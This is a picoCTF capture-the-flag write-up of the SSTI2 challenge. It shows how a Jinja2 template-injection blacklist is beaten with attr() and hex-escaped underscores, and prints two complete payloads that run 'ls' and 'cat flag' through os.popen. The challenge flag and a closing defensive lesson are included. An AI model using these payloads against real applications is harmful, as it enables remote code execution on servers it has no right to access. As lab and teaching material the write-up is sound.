---
title: 'SSTI2'
target: 'picoCTF — SSTI2'
difficulty: 'medium'
date: 2026-07-22
summary: "A picoCTF Web Exploitation challenge where a Flask/Jinja2 app was vulnerable to SSTI but enforced a blacklist blocking dots, underscores, square brackets, and the join keyword. Bypassed the filter using Jinja2's attr() filter with hex escape sequences (\\x5f for underscores) to traverse Python's object hierarchy and achieve RCE."
role: 'appsec'
tags: ['web-exploitation', 'ssti', 'jinja2', 'flask', 'python', 'filter-bypass', 'blacklist-bypass', 'template-injection', 'rce', 'picoctf']
problem: "A Flask/Jinja2 web application that renders user-submitted text as a template, with a blacklist blocking dots, underscores, square brackets, and the join keyword. The objective is to bypass the filter and achieve remote code execution to read the flag file."
action: "Confirmed SSTI with {{7*7}} rendering as 49. The blacklist blocked dots, underscores, square brackets, and join, breaking standard SSTI payload chains. Bypassed using Jinja2's attr() filter instead of dot notation and hex escape sequences (\\x5f) instead of literal underscores to traverse from request through __globals__ to os.popen(). First ran ls to discover the flag file, then swapped to cat flag to read the contents."
outcome: "Retrieved the flag picoCTF{sst1_f1lt3r_byp4ss_e39c23cf} by bypassing the blacklist with Jinja2's attr() filter and hex-escaped underscores. The challenge demonstrated that blacklist-based sanitisation fails against template injection because the engine itself provides alternative syntax for every blocked operation."
draft: false
---

## Background

SSTI2 is a picoCTF Web Exploitation challenge and the sequel to SSTI1. Both challenges present a Flask/Jinja2 web application that lets users submit text to be "announced" — rendered through the template engine. The first challenge had no input filtering at all, making SSTI trivial. This one adds a blacklist that blocks several characters commonly used in SSTI payload chains. The challenge is a practical demonstration of why blacklist-based input sanitisation fails against template injection — the template engine itself provides enough syntactic flexibility to express the same operations in ways the filter does not anticipate.

---

## Confirming the injection

The challenge loaded at `http://shape-facility.picoctf.net:49891` with a simple page: a heading, the text "I built a cool website that lets you announce whatever you want!*", and a text input with an Ok button. The asterisk was a subtle nod to the restrictions that would follow.

The first test was the standard Jinja2 SSTI confirmation — entering `{{7*7}}` into the input field and submitting.

![Home page of the announcement application at shape-facility.picoctf.net:49891 showing the text "I built a cool website that lets you announce whatever you want!*" with a text input field containing the payload {{7*7}} and an Ok button.](/writeups/picoctf-ssti2/01.png)

The application navigated to `/announce` and rendered **49** — the template engine had evaluated the arithmetic expression inside the double curly braces. This confirmed the same SSTI vulnerability from SSTI1 was still present. The server was passing user input directly into `render_template_string()` or equivalent without escaping, meaning anything inside `{{ }}` would be executed as a Jinja2 expression.

---

## Understanding the blacklist

With SSTI confirmed, the next step was to escalate from arithmetic to code execution. In SSTI1, this would have been straightforward — traverse Python's object hierarchy using dot notation to reach `os.popen()` and run system commands. But SSTI2's blacklist blocked the key characters needed for that approach: dots (preventing `request.application`-style attribute access), underscores (blocking dunder attributes like `__globals__` and `__builtins__`), square brackets (preventing dictionary-style access like `globals["builtins"]`), and the `join` keyword (closing off string construction workarounds).

These restrictions were surgical — they targeted the exact syntax elements that standard SSTI payloads depend on. A naive attempt like `{{request.application.__globals__.__builtins__.__import__("os").popen("ls").read()}}` would be rejected before the template engine ever saw it, because the filter would catch the dots and underscores in the raw input string.

---

## Building the bypass

The bypass exploited a fundamental gap in blacklist logic: the filter checked for literal character sequences in the input text, but Jinja2 and Python both offer alternative syntaxes that produce identical results after processing.

Two substitutions were enough to circumvent the entire blacklist. First, Jinja2's `attr()` filter replaces dot notation — instead of `object.attribute`, `object|attr("attribute")` achieves the same attribute access using the pipe operator and a string argument, neither of which were filtered. Second, Python's hexadecimal escape sequences replace literal underscores — `\x5f` inside a string literal is interpreted as an underscore character by the Python string parser, but the blacklist filter sees only the characters `\`, `x`, `5`, `f`, none of which are blocked. So `__globals__` becomes `"\x5f\x5fglobals\x5f\x5f"` in the payload text, but resolves to the same dunder attribute name once Python processes the escape.

With these two building blocks, the full payload chain was:

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("ls")|attr("read")()}}
```

Reading the chain link by link: `request` is the Flask request object always available in Jinja2 templates. `|attr("application")` gets the WSGI application. `|attr("\x5f\x5fglobals\x5f\x5f")` accesses `__globals__` — the module-level namespace. `|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")` pulls the builtins module from that namespace. `|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")` calls `__import__("os")` to import the os module. `|attr("popen")("ls")` runs `ls` through `os.popen()`. `|attr("read")()` reads the command output. Every attribute access uses `attr()` instead of dots, and every dunder name uses `\x5f` instead of underscores — the filter never sees a blocked character.

---

## Enumerating the server and reading the flag

Submitting the directory listing payload returned the server's working directory contents rendered in large bold text on the `/announce` page:

![The /announce page at shape-facility.picoctf.net:49891 displaying the server directory listing in large bold text: __pycache__ app.py flag requirements.txt — the output of the ls command executed through the SSTI payload.](/writeups/picoctf-ssti2/02.png)

Four entries: `__pycache__` (Python's bytecode cache), `app.py` (the Flask application), `flag` (the target), and `requirements.txt` (Python dependencies). The flag was stored in a file simply named `flag` in the application's working directory — no path traversal needed, just a direct `cat`.

Swapped `ls` for `cat flag` in the same payload chain:

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat flag")|attr("read")()}}
```

The application rendered the flag:

![The /announce page displaying the flag in large bold text: picoCTF{sst1_f1lt3r_byp4ss_e39c23cf} — the contents of the flag file read through the SSTI payload with filter bypass.](/writeups/picoctf-ssti2/03.png)

`picoCTF{sst1_f1lt3r_byp4ss_e39c23cf}`

---

## What I took from this

The flag name says it all — `sst1_f1lt3r_byp4ss`. This challenge is a textbook demonstration of why blacklist-based input filtering is a losing strategy for preventing template injection. The blacklist blocked dots, underscores, brackets, and join — five separate restrictions designed to break SSTI payload chains. Every one of them was bypassed with two simple substitutions: `attr()` for dot access and `\x5f` for underscores. The filter never saw a blocked character in the raw input, yet the template engine resolved the payload to exactly the same attribute traversal and command execution as an unfiltered payload would achieve. The correct defence is not a longer blacklist — it is never rendering untrusted input as template code in the first place. If user content must appear in a template, it should be passed as a variable (`render_template("page.html", announcement=user_input)`) rather than interpolated into the template string itself (`render_template_string("..." + user_input)`). That single architectural decision makes SSTI impossible regardless of what characters the attacker uses, because the template engine treats variables as data rather than code. The PayloadsAllTheThings SSTI fuzz list on GitHub was a useful reference for finding alternative expression syntaxes — it catalogues dozens of bypass techniques across multiple template engines, making it an essential resource for both attackers testing for SSTI and defenders trying to understand the attack surface they are up against.
